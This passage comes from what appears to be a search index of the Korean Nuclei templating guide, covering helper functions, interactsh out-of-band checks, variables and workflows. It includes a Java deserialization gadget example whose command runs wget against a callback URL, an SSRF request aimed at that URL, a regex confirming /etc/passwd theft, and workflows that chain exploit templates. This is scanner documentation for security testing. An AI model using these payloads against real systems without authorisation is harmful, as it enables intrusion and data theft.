date_time(dateTimeFormat) go \uc2a4\ud0c0\uc77c\uc758 \ub0a0\uc9dc-\uc2dc\uac04 \ud615\uc2dd\uc73c\ub85c \ub0a0\uc9dc \ub610\ub294 \uc2dc\uac04\uc744 \ubc18\ud658\ud569\ub2c8\ub2e4. date_time(\"%Y-%M-%D %H:%m\") 2022-06-10 14:18 starts_with(str string, prefix ...string) bool \ubb38\uc790\uc5f4\uc774 \uc8fc\uc5b4\uc9c4 \ubd80\ubd84 \ubb38\uc790\uc5f4\ub85c \uc2dc\uc791\ud558\ub294\uc9c0 \ud655\uc778\ud569\ub2c8\ub2e4. starts_with(\"Hello\", \"He\") true line_starts_with(str string, prefix ...string) bool \ubb38\uc790\uc5f4\uc758 \uc904\uc774 \uc8fc\uc5b4\uc9c4 \ubd80\ubd84 \ubb38\uc790\uc5f4\ub85c \uc2dc\uc791\ud558\ub294\uc9c0 \ud655\uc778\ud569\ub2c8\ub2e4. line_starts_with(\"Hi\\nHello\", \"He\") true ends_with(str string, suffix ...string) bool \ubb38\uc790\uc5f4\uc774 \uc8fc\uc5b4\uc9c4 \ubd80\ubd84 \ubb38\uc790\uc5f4\ub85c \ub05d\ub098\ub294\uc9c0 \ud655\uc778\ud569\ub2c8\ub2e4. ends_with(\"Hello\", \"lo\") true line_ends_with(str string, suffix ...string) bool \ubb38\uc790\uc5f4\uc758 \uc904\uc774 \uc8fc\uc5b4\uc9c4 \ubd80\ubd84 \ubb38\uc790\uc5f4\ub85c \ub05d\ub098\ub294\uc9c0 \ud655\uc778\ud569\ub2c8\ub2e4. line_ends_with(\"Hello\\nHi\", \"lo\") true","title":"Helper functions"},{"location":"kr/templating-guide/helper-functions/#deserialization-helper-functions","text":"Nuclei\ub294 ysoserial \uc5d0\uc11c \uba87\uba87 \uc77c\ubc18\uc801\uc778 gadget\uc5d0 \ub300\ud55c \ud398\uc774\ub85c\ub4dc \uc0dd\uc131\uc744 \ud5c8\uc6a9\ud569\ub2c8\ub2e4. Supported Payload: dns (URLDNS) commons-collections3.1 commons-collections4.0 jdk7u21 jdk8u20 groovy1 Supported encodings: base64 (default) gzip-base64 gzip hex raw Deserialization helper function format: {{ generate_java_gadget ( payload, cmd, encoding }} Deserialization helper function example: {{ generate_java_gadget ( \"commons-collections3.1\" , \"wget http://{{interactsh-url}}\" , \"base64\" )}}","title":"Deserialization helper functions"},{"location":"kr/templating-guide/interactsh/","text":"Nuclei v2.3.6 \uacf5\uac1c \uc774\ud6c4 Nuclei\ub294 \uc790\ub3d9 Request \uc0c1\uad00\uad00\uacc4\uac00 \ub0b4\uc7a5\ub41c OOB \uae30\ubc18 \ucde8\uc57d\uc131 \uac80\uc0ac\ub97c \uc704\ud55c interact.sh API\uc758 \uc0ac\uc6a9\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. request\uc758 \uc544\ubb34 \uacf3\uc5d0 \ub098 {{interactsh-url}} \uc744 \uc791\uc131\ud558\uace0 interact_protocol \uc5d0 \ub300\ud55c matcher\ub97c \ucd94\uac00\ud558\ub294 \uac83\ucc98\ub7fc \uc27d\uc2b5\ub2c8\ub2e4. Nuclei\ub294 \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud55c \uc0c1\ud638 \uc791\uc6a9\uc758 \uc0c1\uad00\uad00\uacc4\uc640 \uac04\ud3b8\ud55c OOB \uc2a4\uce94\uc744 \ud5c8\uc6a9\ud558\uc5ec \uc0dd\uc131\ub41c request\ub97c \ucc98\ub9ac\ud569\ub2c8\ub2e4. Interactsh Placeholder \u00b6 {{interactsh-url}} placeholder\ub294 http \ubc0f network requests\uc5d0\uc11c \uc9c0\uc6d0\ub429\ub2c8\ub2e4. {{interactsh-url}} \uc790\ub9ac \ud45c\uc2dc\uc790\uac00 \uc788\ub294 nuclei request\uc758 \uc608\ub294 \uc544\ub798\uc5d0 \ub098\uc640 \uc788\uc2b5\ub2c8\ub2e4. \ub7f0\ud0c0\uc784 \uc2dc \uace0\uc720\ud55c interact.sh URLs\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4. - raw : - | GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/1.1 Host: {{Hostname}} Interactsh Matchers \u00b6 Interactsh \uc0c1\ud638 \uc791\uc6a9\uc740 \ub2e4\uc74c \ubd80\ubd84\uc744 \uc0ac\uc6a9\ud558\uc5ec word , regex \ub610\ub294 dsl matcher/extractor\uc640 \ud568\uaed8 \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. part interactsh_protocol interactsh_request interactsh_response interactsh_protocol \uac12\uc740 dns, http \ub610\ub294 smtp \uc77c \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc774\uac83\uc740 \ubcf8\uc9c8\uc801\uc73c\ub85c \uc2ec\ud558\uac8c \ubc29\ud574\uac00 \ub418\uc9c0 \uc54a\uae30 \ub54c\ubb38\uc5d0 dns\ub97c \uacf5\ud1b5 \uac12\uc73c\ub85c \uc0ac\uc6a9\ud558\ub294 \ubaa8\ub4e0 \uc0c1\ud638 \uc791\uc6a9 \uae30\ubc18 \ud15c\ud50c\ub9bf\uc758 \ud45c\uc900 matcher \uc785\ub2c8\ub2e4. interactsh_request interact.sh \uc11c\ubc84\uac00 \uc218\uc2e0\ud55c request interactsh_response interact.sh \uc11c\ubc84\uac00 \ud074\ub77c\uc774\uc5b8\ud2b8\uc5d0 \ubcf4\ub0b8 response Example of Interactsh DNS Interaction matcher: matchers : - type : word part : interactsh_protocol # Confirms the DNS Interaction words : - \"dns\" Interaction \ucf58\ud150\uce20\uc758 HTTP Interaction matcher + word matcher\uc758 \uc608\uc2dc matchers-condition : and matchers : - type : word part : interactsh_protocol # Confirms the HTTP Interaction words : - \"http\" - type : regex part : interactsh_request # Confirms the retrieval of etc/passwd file regex : - \"root:[x*]:0:0:\"","title":"Interactsh"},{"location":"kr/templating-guide/interactsh/#interactsh-placeholder","text":"{{interactsh-url}} placeholder\ub294 http \ubc0f network requests\uc5d0\uc11c \uc9c0\uc6d0\ub429\ub2c8\ub2e4. {{interactsh-url}} \uc790\ub9ac \ud45c\uc2dc\uc790\uac00 \uc788\ub294 nuclei request\uc758 \uc608\ub294 \uc544\ub798\uc5d0 \ub098\uc640 \uc788\uc2b5\ub2c8\ub2e4. \ub7f0\ud0c0\uc784 \uc2dc \uace0\uc720\ud55c interact.sh URLs\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4. - raw : - | GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/1.1 Host: {{Hostname}}","title":"Interactsh Placeholder"},{"location":"kr/templating-guide/interactsh/#interactsh-matchers","text":"Interactsh \uc0c1\ud638 \uc791\uc6a9\uc740 \ub2e4\uc74c \ubd80\ubd84\uc744 \uc0ac\uc6a9\ud558\uc5ec word , regex \ub610\ub294 dsl matcher/extractor\uc640 \ud568\uaed8 \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. part interactsh_protocol interactsh_request interactsh_response interactsh_protocol \uac12\uc740 dns, http \ub610\ub294 smtp \uc77c \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc774\uac83\uc740 \ubcf8\uc9c8\uc801\uc73c\ub85c \uc2ec\ud558\uac8c \ubc29\ud574\uac00 \ub418\uc9c0 \uc54a\uae30 \ub54c\ubb38\uc5d0 dns\ub97c \uacf5\ud1b5 \uac12\uc73c\ub85c \uc0ac\uc6a9\ud558\ub294 \ubaa8\ub4e0 \uc0c1\ud638 \uc791\uc6a9 \uae30\ubc18 \ud15c\ud50c\ub9bf\uc758 \ud45c\uc900 matcher \uc785\ub2c8\ub2e4. interactsh_request interact.sh \uc11c\ubc84\uac00 \uc218\uc2e0\ud55c request interactsh_response interact.sh \uc11c\ubc84\uac00 \ud074\ub77c\uc774\uc5b8\ud2b8\uc5d0 \ubcf4\ub0b8 response Example of Interactsh DNS Interaction matcher: matchers : - type : word part : interactsh_protocol # Confirms the DNS Interaction words : - \"dns\" Interaction \ucf58\ud150\uce20\uc758 HTTP Interaction matcher + word matcher\uc758 \uc608\uc2dc matchers-condition : and matchers : - type : word part : interactsh_protocol # Confirms the HTTP Interaction words : - \"http\" - type : regex part : interactsh_request # Confirms the retrieval of etc/passwd file regex : - \"root:[x*]:0:0:\"","title":"Interactsh Matchers"},{"location":"kr/templating-guide/preprocessors/","text":"Template Preprocessors (\ud15c\ud50c\ub9bf \uc804\ucc98\ub9ac\uae30) \u00b6 \uac01 \ud15c\ud50c\ub9bf \uc2e4\ud589\uc5d0 \ub300\ud574 \uc0dd\uc131\ub41c \uc784\uc758\uc758 ID\uc640 \uac19\uc740 \uac83\uc744 \ub2ec\uc131\ud558\uae30 \uc704\ud574 \ud15c\ud50c\ub9bf\uc774 \ub85c\ub4dc\ub418\uc790\ub9c8\uc790 \uc2e4\ud589\ub418\ub294 \ud15c\ud50c\ub9bf\uc758 \uc5b4\ub290 \uacf3\uc5d0\uc11c\ub098 \ud2b9\uc815 \uc804\ucc98\ub9ac\uae30\ub97c \uc804\uc5ed\uc801\uc73c\ub85c \uc9c0\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. randstr \u00b6 Info \uac01 nuclei \uc2e4\ud589\uc5d0\uc11c \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud55c random ID \ub97c \uc0dd\uc131\ud569\ub2c8\ub2e4. \uc774\uac83\uc740 \ud15c\ud50c\ub9bf\uc758 \uc5b4\ub514\uc5d0\uc11c\ub098 \uc0ac\uc6a9\ud560 \uc218 \uc788\uc73c\uba70 \ud56d\uc0c1 \ub3d9\uc77c\ud55c \uac12\uc744 \ud3ec\ud568\ud569\ub2c8\ub2e4. randstr \uc740 \uc22b\uc790\ub85c \uc811\ubbf8\uc0ac\ub85c \ud560 \uc218 \uc788\uc73c\uba70, \ud574\ub2f9 \uc774\ub984\uc5d0 \ub300\ud574\uc11c\ub3c4 \uc0c8\ub85c\uc6b4 \uc784\uc758\uc758 ID\uac00 \uc0dd\uc131\ub429\ub2c8\ub2e4. \uc608\uc2dc. \ud15c\ud50c\ub9bf \uc804\uccb4\uc5d0\uc11c \ub3d9\uc77c\ud558\uac8c \uc720\uc9c0\ub418\ub294 {{randstr_1}} `randstr`\uc740 matcher \ub0b4\uc5d0\uc11c\ub3c4 \uc9c0\uc6d0\ub418\uba70, \uc785\ub825\uc744 \ub9e4\uce6d\ud558\ub294\ub370 \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc608\uc2dc:- http : - method : POST path : - \"{{BaseURL}}/level1/application/\" headers : cmd : echo '{{randstr}}' matchers : - type : word words : - '{{randstr}}'","title":"Preprocessors"},{"location":"kr/templating-guide/preprocessors/#template-preprocessors","text":"\uac01 \ud15c\ud50c\ub9bf \uc2e4\ud589\uc5d0 \ub300\ud574 \uc0dd\uc131\ub41c \uc784\uc758\uc758 ID\uc640 \uac19\uc740 \uac83\uc744 \ub2ec\uc131\ud558\uae30 \uc704\ud574 \ud15c\ud50c\ub9bf\uc774 \ub85c\ub4dc\ub418\uc790\ub9c8\uc790 \uc2e4\ud589\ub418\ub294 \ud15c\ud50c\ub9bf\uc758 \uc5b4\ub290 \uacf3\uc5d0\uc11c\ub098 \ud2b9\uc815 \uc804\ucc98\ub9ac\uae30\ub97c \uc804\uc5ed\uc801\uc73c\ub85c \uc9c0\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4.","title":"Template Preprocessors (\ud15c\ud50c\ub9bf \uc804\ucc98\ub9ac\uae30)"},{"location":"kr/templating-guide/preprocessors/#randstr","text":"Info \uac01 nuclei \uc2e4\ud589\uc5d0\uc11c \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud55c random ID \ub97c \uc0dd\uc131\ud569\ub2c8\ub2e4. \uc774\uac83\uc740 \ud15c\ud50c\ub9bf\uc758 \uc5b4\ub514\uc5d0\uc11c\ub098 \uc0ac\uc6a9\ud560 \uc218 \uc788\uc73c\uba70 \ud56d\uc0c1 \ub3d9\uc77c\ud55c \uac12\uc744 \ud3ec\ud568\ud569\ub2c8\ub2e4. randstr \uc740 \uc22b\uc790\ub85c \uc811\ubbf8\uc0ac\ub85c \ud560 \uc218 \uc788\uc73c\uba70, \ud574\ub2f9 \uc774\ub984\uc5d0 \ub300\ud574\uc11c\ub3c4 \uc0c8\ub85c\uc6b4 \uc784\uc758\uc758 ID\uac00 \uc0dd\uc131\ub429\ub2c8\ub2e4. \uc608\uc2dc. \ud15c\ud50c\ub9bf \uc804\uccb4\uc5d0\uc11c \ub3d9\uc77c\ud558\uac8c \uc720\uc9c0\ub418\ub294 {{randstr_1}} `randstr`\uc740 matcher \ub0b4\uc5d0\uc11c\ub3c4 \uc9c0\uc6d0\ub418\uba70, \uc785\ub825\uc744 \ub9e4\uce6d\ud558\ub294\ub370 \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc608\uc2dc:- http : - method : POST path : - \"{{BaseURL}}/level1/application/\" headers : cmd : echo '{{randstr}}' matchers : - type : word words : - '{{randstr}}'","title":"randstr"},{"location":"kr/templating-guide/variables/","text":"Variables (\ubcc0\uc218) \u00b6 variable\uc744 \uc0ac\uc6a9\ud558\uc5ec \ud15c\ud50c\ub9bf \uc804\uccb4\uc5d0\uc11c \uc77c\uc815\ud558\uac8c \uc720\uc9c0\ub418\ub294 \uc77c\ubd80 \uac12\uc744 \uc120\uc5b8\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ud55c \ubc88 \uacc4\uc0b0\ub41c variable\uc758 \uac12\uc740 \ubcc0\uacbd\ub418\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4. variable\uc740 \ub2e8\uc21c \ubb38\uc790\uc5f4 \ub610\ub294 DSL helper function \uc77c \uc218 \uc788\uc2b5\ub2c8\ub2e4. variable\uc774 helper function\uc778 \uacbd\uc6b0, \uc774\uc911 \uc911\uad04\ud638 {{<expression>}} \ub85c \ubb36\uc785\ub2c8\ub2e4. variable\uc740 \ud15c\ud50c\ub9bf \uc218\uc900\uc5d0\uc11c \uc120\uc5b8\ub429\ub2c8\ub2e4. \uc608\uc2dc variables - variables : a1 : \"test\" # A string variable a2 : \"{{to_lower(rand_base(5))}}\" # A DSL function variable \ud604\uc7ac dns , http , headless \ubc0f network \ud504\ub85c\ud1a0\ucf5c\uc740 variable\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. variable\uc744 \uc0ac\uc6a9\ud55c \ud15c\ud50c\ub9bf \uc608\uc2dc - # Variable example using HTTP requests id : variables-example info : name : Variables Example author : pdteam severity : info variables : a1 : \"value\" a2 : \"{{base64('hello')}}\" http : - raw : - | GET / HTTP/1.1 Host: {{FQDN}} Test: {{a1}} Another: {{a2}} stop-at-first-match : true matchers-condition : or matchers : - type : word words : - \"value\" - \"aGVsbG8=\" # Variable example for network requests id : variables-example info : name : Variables Example author : pdteam severity : info variables : a1 : \"PING\" a2 : \"{{base64('hello')}}\" tcp : - host : - \"{{Hostname}}\" inputs : - data : \"{{a1}}\" read-size : 8 matchers : - type : word part : data words : - \"{{a2}}\"","title":"Variables"},{"location":"kr/templating-guide/variables/#variables","text":"variable\uc744 \uc0ac\uc6a9\ud558\uc5ec \ud15c\ud50c\ub9bf \uc804\uccb4\uc5d0\uc11c \uc77c\uc815\ud558\uac8c \uc720\uc9c0\ub418\ub294 \uc77c\ubd80 \uac12\uc744 \uc120\uc5b8\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ud55c \ubc88 \uacc4\uc0b0\ub41c variable\uc758 \uac12\uc740 \ubcc0\uacbd\ub418\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4. variable\uc740 \ub2e8\uc21c \ubb38\uc790\uc5f4 \ub610\ub294 DSL helper function \uc77c \uc218 \uc788\uc2b5\ub2c8\ub2e4. variable\uc774 helper function\uc778 \uacbd\uc6b0, \uc774\uc911 \uc911\uad04\ud638 {{<expression>}} \ub85c \ubb36\uc785\ub2c8\ub2e4. variable\uc740 \ud15c\ud50c\ub9bf \uc218\uc900\uc5d0\uc11c \uc120\uc5b8\ub429\ub2c8\ub2e4. \uc608\uc2dc variables - variables : a1 : \"test\" # A string variable a2 : \"{{to_lower(rand_base(5))}}\" # A DSL function variable \ud604\uc7ac dns , http , headless \ubc0f network \ud504\ub85c\ud1a0\ucf5c\uc740 variable\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. variable\uc744 \uc0ac\uc6a9\ud55c \ud15c\ud50c\ub9bf \uc608\uc2dc - # Variable example using HTTP requests id : variables-example info : name : Variables Example author : pdteam severity : info variables : a1 : \"value\" a2 : \"{{base64('hello')}}\" http : - raw : - | GET / HTTP/1.1 Host: {{FQDN}} Test: {{a1}} Another: {{a2}} stop-at-first-match : true matchers-condition : or matchers : - type : word words : - \"value\" - \"aGVsbG8=\" # Variable example for network requests id : variables-example info : name : Variables Example author : pdteam severity : info variables : a1 : \"PING\" a2 : \"{{base64('hello')}}\" tcp : - host : - \"{{Hostname}}\" inputs : - data : \"{{a1}}\" read-size : 8 matchers : - type : word part : data words : - \"{{a2}}\"","title":"Variables (\ubcc0\uc218)"},{"location":"kr/templating-guide/workflows/","text":"Workflows (\uc791\uc5c5\ud750\ub984) \u00b6 workflow\ub97c \ud1b5\ud574 \uc0ac\uc6a9\uc790\ub294 \ud15c\ud50c\ub9bf\uc758 \uc2e4\ud589 \uc21c\uc11c\ub97c \uc815\uc758\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ud15c\ud50c\ub9bf\uc740 \uc815\uc758\ub41c \uc870\uac74\uc5d0\uc11c \uc2e4\ud589\ub429\ub2c8\ub2e4. \ubaa8\ub4e0 \ud15c\ud50c\ub9bf\uc744 \uc0ac\uc6a9\uc790\uc758 \uc694\uad6c\uc5d0 \ub530\ub77c \uad6c\uc131\ud558\ub294 \ubc29\ubc95\uc774 nuclei\ub97c \uc0ac\uc6a9\ud558\ub294 \uac00\uc7a5 \ud6a8\uc728\uc801\uc778 \ubc29\ubc95\uc785\ub2c8\ub2e4. \uc989, \ud2b9\uc815 \uae30\uc220\uc774 \uac10\uc9c0\ub420 \ub54c\ub9cc \uc2e4\ud589\ub418\ub294 WordPress Workflow, Jira Workflow\uc640 \uac19\uc740 \uae30\uc220 \uae30\ubc18/\ub300\uc0c1 \uae30\ubc18 workflow\ub97c \ub9cc\ub4e4 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uae30\uc220 \uc2a4\ud0dd\uc774 \uc54c\ub824\uc9c4 \uacbd\uc6b0 \uc2a4\uce94\uc744 \uc2e4\ud589\ud558\uae30 \uc704\ud55c \uc0ac\uc6a9\uc790 \uc9c0\uc815 workflow\ub97c \ub9cc\ub4dc\ub294 \uac83\uc774 \uc88b\uc2b5\ub2c8\ub2e4. \uc774 \ubc29\ubc95\uc744 \ud1b5\ud574 \ub354 \ub098\uc740 \uacb0\uacfc\uc640 \ud6e8\uc52c \uc801\uc740 \uc2a4\uce94 \uc2dc\uac04\uc744 \uc5bb\uc744 \uc218 \uc788\uc2b5\ub2c8\ub2e4. workflow\ub294 \uc2e4\ud589\ud560 template / subtemplates \ubc0f tags \ub97c \ub530\ub77c workflows \uc18d\uc131\uc73c\ub85c \uc815\uc758\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. workflows : - template : technologies/template-to-execute.yaml Type of workflows Generic workflows (\uc77c\ubc18 \uc791\uc5c5\ud750\ub984) Conditional workflows (\uc870\uac74\ubd80 \uc791\uc5c5\ud750\ub984) Generic Workflows (\uc77c\ubc18 \uc791\uc5c5\ud750\ub984) \u00b6 generic workflow\uc5d0\uc11c\ub294 \ub2e8\uc77c workflow \ud30c\uc77c\uc5d0\uc11c \uc2e4\ud589\ud560 \ub2e8\uc77c \ub610\ub294 \uc5ec\ub7ec \ud15c\ud50c\ub9bf\uc744 \uc815\uc758\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ud30c\uc77c\uacfc \ub514\ub809\ud1a0\ub9ac\ub97c \ubaa8\ub450 \uc785\ub825\uc73c\ub85c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uc8fc\uc5b4\uc9c4 URL \ubaa9\ub85d\uc5d0\uc11c \ubaa8\ub4e0 \uad6c\uc131 \uad00\ub828 \ud15c\ud50c\ub9bf\uc744 \uc2e4\ud589\ud558\ub294 workflow. workflows : - template : files/git-config.yaml - template : files/svn-config.yaml - template : files/env-file.yaml - template : files/backup-files.yaml - tags : xss,ssrf,cve,lfi \ud504\ub85c\uc81d\ud2b8\uc5d0 \ub300\ud574 \uc815\uc758\ub41c \ud2b9\uc815 \uac80\uc0ac \ubaa9\ub85d\uc744 \uc2e4\ud589\ud558\ub294 workflow. workflows : - template : cves/ - template : exposed-tokens/ - template : exposures/ - tags : exposures Conditional Workflows (\uc870\uac74\ubd80 \uc791\uc5c5\ud750\ub984) \u00b6 \uc774\uc804 \ud15c\ud50c\ub9bf\uc758 \uc870\uac74\uc744 \uc77c\uce58\uc2dc\ud0a8 \ud6c4 \uc2e4\ud589\ub418\ub294 \uc870\uac74 \ud15c\ud50c\ub9bf\uc744 \uc0dd\uc131\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ucde8\uc57d\uc810 \ud0d0\uc9c0 \ubc0f exploitation\ubfd0\ub9cc \uc544\ub2c8\ub77c \uae30\uc220 \uae30\ubc18 \ud0d0\uc9c0 \ubc0f exploitation\uc5d0\ub3c4 \uc720\uc6a9\ud569\ub2c8\ub2e4. \uc774\ub7ec\ud55c \uc885\ub958\uc758 workflow\uc5d0 \ub300\ud55c \uc0ac\uc6a9 \uc0ac\ub840\ub294 \ubc29\ub300\ud558\uace0 \ub2e4\uc591\ud569\ub2c8\ub2e4. \ud15c\ud50c\ub9bf \uae30\ubc18 \uc870\uac74 \uccb4\ud06c \uae30\ubcf8 \ud15c\ud50c\ub9bf\uc774 \uc77c\uce58\ud560 \ub54c \ud558\uc704 \ud15c\ud50c\ub9bf\uc744 \uc2e4\ud589\ud558\ub294 workflow. workflows : - template : technologies/jira-detect.yaml subtemplates : - tags : jira - template : exploits/jira/ matcher \uc774\ub984 \uae30\ubc18 \uc870\uac74 \uccb4\ud06c \uacb0\uacfc\uc5d0\uc11c \uae30\ubcf8 \ud15c\ud50c\ub9bf\uc758 matcher\uac00 \ubc1c\uacac\ub418\uba74 \ud558\uc704 \ud15c\ud50c\ub9bf\uc744 \uc2e4\ud589\ud558\ub294 workflow. workflows : - template : technologies/tech-detect.yaml matchers : - name : vbulletin subtemplates : - template : exploits/vbulletin-exp1.yaml - template : exploits/vbulletin-exp2.yaml - name : jboss subtemplates : - template : exploits/jboss-exp1.yaml - template : exploits/jboss-exp2.yaml \ube44\uc2b7\ud55c \ubc29\uc2dd\uc73c\ub85c \ud544\uc694\ud55c \ub9cc\ud07c workflow\uc5d0 \ub300\ud55c \uc911\ucca9 \uac80\uc0ac\ub97c \ub9cc\ub4e4 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ud558\uc704 \ud15c\ud50c\ub9bf\uacfc matcher \uc774\ub984 \uae30\ubc18 \ub2e4\uc911 \ub808\ubca8 \uc870\uac74 \uccb4\ud06c \uc774\uc804 \ud15c\ud50c\ub9bf\uc774 \uc77c\uce58\ud558\ub294 \uacbd\uc6b0\uc5d0\ub9cc \uc2e4\ud589\ub418\ub294 \ud15c\ud50c\ub9bf \uc2e4\ud589 \uccb4\uc778\uc744 \ubcf4\uc5ec\uc8fc\ub294 workflow. workflows : - template : technologies/tech-detect.yaml matchers : - name : lotus-domino subtemplates : - template : technologies/lotus-domino-version.yaml subtemplates : - template : cves/xx-yy-zz.yaml subtemplates : - template : cves/xx-xx-xx.yaml conditional workflows\ub294 \ubaa8\ub4e0 \ub300\uc0c1\uc5d0 \ubaa8\ub4e0 \ud15c\ud50c\ub9bf\uc744 \uc801\uc6a9\ud558\ub294 \ub300\uc2e0 \uac00\uc7a5 \ud6a8\uc728\uc801\uc778 \ubc29\uc2dd\uc73c\ub85c \uac80\uc0ac \ubc0f \ucde8\uc57d\uc131 \ud0d0\uc9c0\ub97c \uc218\ud589\ud558\ub294 \uc88b\uc740 \uc608\uc774\uba70 \uc77c\ubc18\uc801\uc73c\ub85c \uc2dc\uac04\uc5d0 \ub300\ud55c ROI\uac00 \uc6b0\uc218\ud558\uace0 \ub300\uc0c1\uc5d0\ub3c4 \uc801\ud569\ud569\ub2c8\ub2e4. \ub354 \uc644\uc804\ud55c workflow \uc608\uc81c\ub4e4\uc740 here \uc5d0\uc11c \uc81c\uacf5\ub429\ub2c8\ub2e4.","title":"Workflows"},{"location":"kr/templating-guide/workflows/#workflows","text":"workflow\ub97c \ud1b5\ud574 \uc0ac\uc6a9\uc790\ub294 \ud15c\ud50c\ub9bf\uc758 \uc2e4\ud589 \uc21c\uc11c\ub97c \uc815\uc758\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ud15c\ud50c\ub9bf\uc740 \uc815\uc758\ub41c \uc870\uac74\uc5d0\uc11c \uc2e4\ud589\ub429\ub2c8\ub2e4. \ubaa8\ub4e0 \ud15c\ud50c\ub9bf\uc744 \uc0ac\uc6a9\uc790\uc758 \uc694\uad6c\uc5d0 \ub530\ub77c \uad6c\uc131\ud558\ub294 \ubc29\ubc95\uc774 nuclei\ub97c \uc0ac\uc6a9\ud558\ub294 \uac00\uc7a5 \ud6a8\uc728\uc801\uc778 \ubc29\ubc95\uc785\ub2c8\ub2e4. \uc989, \ud2b9\uc815 \uae30\uc220\uc774 \uac10\uc9c0\ub420 \ub54c\ub9cc \uc2e4\ud589\ub418\ub294 WordPress Workflow, Jira Workflow\uc640 \uac19\uc740 \uae30\uc220 \uae30\ubc18/\ub300\uc0c1 \uae30\ubc18 workflow\ub97c \ub9cc\ub4e4 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uae30\uc220 \uc2a4\ud0dd\uc774 \uc54c\ub824\uc9c4 \uacbd\uc6b0 \uc2a4\uce94\uc744 \uc2e4\ud589\ud558\uae30 \uc704\ud55c \uc0ac\uc6a9\uc790 \uc9c0\uc815 workflow\ub97c \ub9cc\ub4dc\ub294 \uac83\uc774 \uc88b\uc2b5\ub2c8\ub2e4. \uc774 \ubc29\ubc95\uc744 \ud1b5\ud574 \ub354 \ub098\uc740 \uacb0\uacfc\uc640 \ud6e8\uc52c \uc801\uc740 \uc2a4\uce94 \uc2dc\uac04\uc744 \uc5bb\uc744 \uc218 \uc788\uc2b5\ub2c8\ub2e4. workflow\ub294 \uc2e4\ud589\ud560 template / subtemplates \ubc0f tags \ub97c \ub530\ub77c workflows \uc18d\uc131\uc73c\ub85c \uc815\uc758\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. workflows : - template : technologies/template-to-execute.yaml Type of workflows Generic workflows (\uc77c\ubc18 \uc791\uc5c5\ud750\ub984) Conditional workflows (\uc870\uac74\ubd80 \uc791\uc5c5\ud750\ub984)","title":"Workflows (\uc791\uc5c5\ud750\ub984)"},{"location":"kr/templating-guide/workflows/#generic-workflows","text":"generic workflow\uc5d0\uc11c\ub294 \ub2e8\uc77c workflow \ud30c\uc77c\uc5d0\uc11c \uc2e4\ud589\ud560 \ub2e8\uc77c \ub610\ub294 \uc5ec\ub7ec \ud15c\ud50c\ub9bf\uc744 \uc815\uc758\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ud30c\uc77c\uacfc \ub514\ub809\ud1a0\ub9ac\ub97c \ubaa8\ub450 \uc785\ub825\uc73c\ub85c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uc8fc\uc5b4\uc9c4 URL \ubaa9\ub85d\uc5d0\uc11c \ubaa8\ub4e0 \uad6c\uc131 \uad00\ub828 \ud15c\ud50c\ub9bf\uc744 \uc2e4\ud589\ud558\ub294 workflow. workflows : - template : files/git-config.yaml - template : files/svn-config.yaml - template : files/env-file.yaml - template : files/backup-files.yaml - tags : xss,ssrf,cve,lfi \ud504\ub85c\uc81d\ud2b8\uc5d0 \ub300\ud574 \uc815\uc758\ub41c \ud2b9\uc815 \uac80\uc0ac \ubaa9\ub85d\uc744 \uc2e4\ud589\ud558\ub294 workflow. workflows : - template : cves/ - template : exposed-tokens/ - template : exposures/ - tags : exposures","title":"Generic Workflows (\uc77c\ubc18 \uc791\uc5c5\ud750\ub984)"},{"location":"kr/templating-guide/workflows/#conditional-workflows","text":"\uc774\uc804 \ud15c\ud50c\ub9bf\uc758 \uc870\uac74\uc744 \uc77c\uce58\uc2dc\ud0a8 \ud6c4 \uc2e4\ud589\ub418\ub294 \uc870\uac74 \ud15c\ud50c\ub9bf\uc744 \uc0dd\uc131\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ucde8\uc57d\uc810 \ud0d0\uc9c0 \ubc0f exploitation\ubfd0\ub9cc \uc544\ub2c8\ub77c \uae30\uc220 \uae30\ubc18 \ud0d0\uc9c0 \ubc0f exploitation\uc5d0\ub3c4 \uc720\uc6a9\ud569\ub2c8\ub2e4. \uc774\ub7ec\ud55c \uc885\ub958\uc758 workflow\uc5d0 \ub300\ud55c \uc0ac\uc6a9 \uc0ac\ub840\ub294 \ubc29\ub300\ud558\uace0 \ub2e4\uc591\ud569\ub2c8\ub2e4. \ud15c\ud50c\ub9bf \uae30\ubc18 \uc870\uac74 \uccb4\ud06c \uae30\ubcf8 \ud15c\ud50c\ub9bf\uc774 \uc77c\uce58\ud560 \ub54c \ud558\uc704 \ud15c\ud50c\ub9bf\uc744 \uc2e4\ud589\ud558\ub294 workflow. workflows : - template : technologies/jira-detect.yaml 